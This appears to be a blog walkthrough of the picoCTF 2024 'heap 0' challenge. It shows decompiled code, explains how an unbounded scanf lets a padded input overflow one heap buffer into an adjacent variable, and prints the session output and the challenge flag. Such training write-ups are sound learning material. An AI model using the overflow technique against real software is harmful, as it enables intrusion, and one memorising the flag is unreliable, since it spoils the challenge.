---
title: PicoCTF - heap 0
published: 2025-08-07
description: PicoCTF Writeup for heap 0 Challenge
tags: [binary exploitation, easy, picoCTF 2024]
category: PicoCTF Writeup
draft: false
lang: en
---

# PicoCTF Writeup - heap 0

BNDB (Binary Ninja Database): [/bndb/202508071345.bndb](/blog/bndb/202508071345.bndb)

PicoCTF Challenge: 
[https://play.picoctf.org/practice/challenge/438?category=6&page=1](https://play.picoctf.org/practice/challenge/438?category=6&page=1)

> ## heap 0
> Author: Abrxs, pr1or1tyQ
> 
> ### Description
> Are overflows just a stack concern?<br>
> Download the binary here.<br>
> Download the source here.<br>
> Connect with the challenge instance here:<br>
> ### Hints
> 1st - What part of the heap do you have control over and how far is it from the safe_var?<br>
> ### Resources:
> Source Code: [/chall.c](https://artifacts.picoctf.net/c_tethys/14/chall.c)<br>
> Binary: [/chall](https://artifacts.picoctf.net/c_tethys/14/chall)<br>

```bash title="Server Information"
$ nc tethys.picoctf.net 61640
```

## Decompile

We can decompile the binary to a pseudo C like this (Binary Ninja):

```c title="/chall_original.c"
004011c0    int check_win()

004011c0    {
004011c0        if (!strcmp(safe_var, "bico"))
004011da        {
00401210            printf("Looks like everything is still secure!");
004011ef            printf("\nNo flage for you :(");
00401208            return fflush(stdout);
004011da        }
004011da        
00401210        printf("\nYOU WIN");
00401236        char flag[64]; /* 0x40 => 64 */
00401236        fgets(&flag, 64, fopen("flag.txt", "r"));
0040123e        printf(&flag);
0040124d        fflush(stdout);
00401254        exit(0);
00401254        /* no return */
004011c0    }

/* ... */

004013c0    int main()
004013c0    /* int32_t argc => Not used */
004013c0    /* char** argv => Not used */
004013c0    /* char** envp => Not used */

004013c0    {
004013ca        int input_buffer;
004013d2        printf("\nWelcome to heap0!");
004013de        printf("I put my data on the heap so it should be safe from any tampering.");
004013ea        printf("Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.\n");
004013fa        fflush(stdout);

00401409        input_data = malloc(5);
00401410        strncpy(buffer, "pico", 5);
0040142b        safe_var = malloc(5);
0040142b        strncpy(buffer2, "bico", 5);

0040143c        printf("Heap State:");
0040144b        printf("+-------------+----------------+");
00401457        printf("[*] Address   ->   Heap Data   ");
0040145f        printf("+-------------+----------------+");
0040147a        printf("[*]   %p  ->   %s\n", input_data);
00401482        printf("+-------------+----------------+");
00401496        printf("[*]   %p  ->   %s\n", safe_var);
0040149e        printf("+-------------+----------------+");
004014a7        fflush(stdout);
004014a7        
004014d5        while (true)
004014d5        {
004014d5            printf("
                        \n1. Print Heap:\t\t(print the current state of the heap)
                        \n2. Write to buffer:\t(write to your own personal block of data on the heap)
                        \n3. Print safe_var:\t(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
                        \n4. Print Flag:\t\t(Try to print the flag, good luck)
                        \n5. Exit
                        \n
                        \nEnter your choice: ");
004014de            fflush(stdout);

004014de            
004014f3            if (scanf("%d", &input_buffer) != 1)
004014f3            {
00401602                exit(0);
00401602                /* no return */
004014f3            }
004014f3            
004014fd            int choice_int = input_buffer - 1;
00401503            char const* const str;
00401503            
00401503            if (choice_int > 4)
00401503            {
0040158a                str = "Invalid choice";
00401591                label_401591:
00401591                printf(str);
004015e2                fflush(stdout);
00401503            }
00401503            else
00401510                switch (choice_int)
00401510                {
00401519                    case 0:
00401519                    {
00401519                        printf("Heap State:");
00401528                        printf("+-------------+----------------+");
00401534                        printf("[*] Address   ->   Heap Data   ");
0040153c                        printf("+-------------+----------------+");
0040155a                        printf("[*]   %p  ->   %s\n", input_data);
00401562                        printf("+-------------+----------------+");
00401579                        printf("[*]   %p  ->   %s\n", safe_var);
0040157e                        str = "+-------------+----------------+";
00401588                        goto label_401591;
00401519                    }
004015a1                    case 1:
004015a1                    {
004015a1                        printf("Data for buffer: ");
004015aa                        fflush(stdout);
004015bf                        scanf("%s", &input_data);
004015c4                        continue;
004015a1                    }
004015d9                    case 2:
004015d9                    {
004015d9                        printf("\n\nTake a look at my variable: safe_var = %s\n\n", safe_var);
004015e2                        fflush(stdout);
004015e7                        continue;
004015d9                    }
004014c8                    case 3:
004014c8                    {
004014c8                        check_win();
004014cd                        continue;
004014c8                    }
00401510                    case 4:
00401510                    {
00401510                        break;
00401510                        break;
00401510                    }
00401510                }
004014d5        }
004014d5        
004015fc        return 0;
004013c0    }


```

This is the full source code (decompiled):

```c title="/chall.c"
int check_win()
{
    if (!strcmp(safe_var, "bico"))
    {
        printf("Looks like everything is still secure!");
        printf("\nNo flage for you :(");
        return fflush(stdout);
    }
    
    printf("\nYOU WIN");

    char flag[64];
    fgets(&flag, 64, fopen("flag.txt", "r"));
    printf(&flag);
    fflush(stdout);

    exit(0);
}

void print_heap_state() {
    printf("Heap State:");
    printf("+-------------+----------------+");
    printf("[*] Address   ->   Heap Data   ");
    printf("+-------------+----------------+");
    printf("[*]   %p  ->   %s\n", input_data);
    printf("+-------------+----------------+");
    printf("[*]   %p  ->   %s\n", safe_var);
    printf("+-------------+----------------+");
    fflush(stdout);
}

int main()
{
    int choice;

    printf("\nWelcome to heap0!");
    printf("I put my data on the heap so it should be safe from any tampering.");
    printf("Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.\n");
    fflush(stdout);

    input_data = malloc(5);
    strncpy(buffer, "pico", 5);

    safe_var = malloc(5);
    strncpy(buffer2, "bico", 5);

    print_heap_state();
    
    while (true)
    {
        printf("
        \n1. Print Heap:\t\t(print the current state of the heap)
        \n2. Write to buffer:\t(write to your own personal block of data on the heap)
        \n3. Print safe_var:\t(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
        \n4. Print Flag:\t\t(Try to print the flag, good luck)
        \n5. Exit\n
        \nEnter your choice: "); 
        fflush(stdout);

        if (scanf("%d", &choice) != 1)
        {
            exit(0);
        }
        
        
        if (choice > 5)
        {
            printf("Invalid choice");
            fflush(stdout);
        }
        else
            switch (choice)
            {
                case 1:
                {
                    print_heap_state();
                    continue;
                }
                case 2:
                {
                    printf("Data for buffer: ");
                    fflush(stdout);
                    scanf("%s", &input_data);
                    continue;
                }
                case 3:
                {
                    printf("\n\nTake a look at my variable: safe_var = %s\n\n", safe_var);
                    fflush(stdout);
                    continue;
                }
                case 4:
                {
                    check_win();
                    continue;
                }
                case 5:
                {
                    break;
                    break;
                }
            }
    }
    
    return 0;
}
```

## Analysis

This program allocates two heap memory variables, `input_data` and safe_var, using `malloc()`, and allows the user to modify `input_data` through input.

However, in this program, a heap overflow is possible through `scanf()` on the heap memory.

When option 4 (flag output) is executed, the flag is printed if `safe_var` is not equal to `bico`. This means that by exploiting a heap overflow in `input_data` and overwriting the memory location of `safe_var`, an attacker can tamper with its value and trigger the flag to be displayed.

```bash
Enter your choice: 2
Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5ba80e6932b0  ->   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest
+-------------+----------------+
[*]   0x5ba80e6932d0  ->   test
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 3


Take a look at my variable: safe_var = test


1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_1ad0e1a6}
```

The flag is: `picoCTF{my_first_heap_overflow_1ad0e1a6}`